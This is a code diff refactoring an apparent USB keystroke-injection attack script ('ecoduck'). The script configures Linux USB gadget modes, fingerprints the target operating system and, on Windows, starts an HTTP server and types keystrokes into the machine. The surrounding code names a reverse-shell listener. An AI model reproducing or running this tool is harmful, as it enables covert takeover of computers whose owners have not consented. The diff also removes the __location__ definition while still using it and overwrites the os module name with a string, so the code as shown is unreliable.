@@ -61,18 +61,8 @@ def reverse_shell_listener():
 
 
 def payload(web_dir, httpd):
-	eco.change_hid()
-	connected=False
-	print("Waiting for network to come up")
-	while(not connected):
-		response = os.system("ping -W 1 -c 1 192.168.10.101")
-		if(response == 0):
-			connected=True
-	print("Network up")
-	os.chdir(web_dir)
 	httplistener=Process(target=httpd.handle_request)
 	httplistener.start()
-	os.chdir("..")
 	for i in range(5):
 		eco.press("ESC")
 		sleep(0.3)
@@ -97,42 +87,28 @@ def payload(web_dir, httpd):
 	eco.press("LGUI+d")
 
 
-# Ensures simple gadget is selected
-__location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
-os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC 2>/dev/null")
-os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC 2>/dev/null")
-os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
-os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC 2>/dev/null")
-print("Waiting for connection...")
-web_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), 'http'))
+# Setting up HTTP server
+web_dir = os.path.abspath(os.path.join(__location__, 'http'))
 os.chdir(web_dir)
 httpHandler = http.server.SimpleHTTPRequestHandler
 httpd = socketserver.TCPServer(('',8000),httpHandler)
 
+print("Waiting for connection...")
 while(1):
-	if(eco.test_connection("/dev/hidg0", 1)):
+	if(eco.is_hid_connected(1)):
 		print("Device connected to target")
-		# OS Fingerprinting
-		detectedos = eco.get_target_os()
-		if "Windows" == detectedos:
-			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
-			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
-		else:
-			os.system("echo \"\" >  /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
-			os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
-		path=check_output("/bin/ls /dev/hidg*",shell=True).decode()[:-1]
-		print("HID Path is: " + path)
-		print("Target OS is: " + detectedos)
-		sleep(2)
-		if "Windows" == detectedos:
+		print("Getting OS")
+		os=eco.get_os()
+		if(os == "windows"):
+			print("Correct OS")
+			eco.set_gadget_mode(os)
+			eco.wait_for_network_state(True)
 			payload(web_dir, httpd)
-		print("Payload completed")
-		# Switch back to simple gadget
-		if "Windows" == detectedos:
-			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-win/UDC")
+			print("Payload execution complete")
 		else:
-			os.system("echo \"\" > /sys/kernel/config/usb_gadget/ecoduck-other/UDC")
-		os.system("ls /sys/class/udc > /sys/kernel/config/usb_gadget/ecoduck-simple/UDC")
-		sleep(4)
-		eco.wait_for_disconnect()
+			print("Invalid OS - payload not executing")
+		print("Waiting for disconnect")
+		eco.wait_for_keyboard_state(False)
+		print("Disconnected!")
+		eco.set_gadget_mode("simple")
 
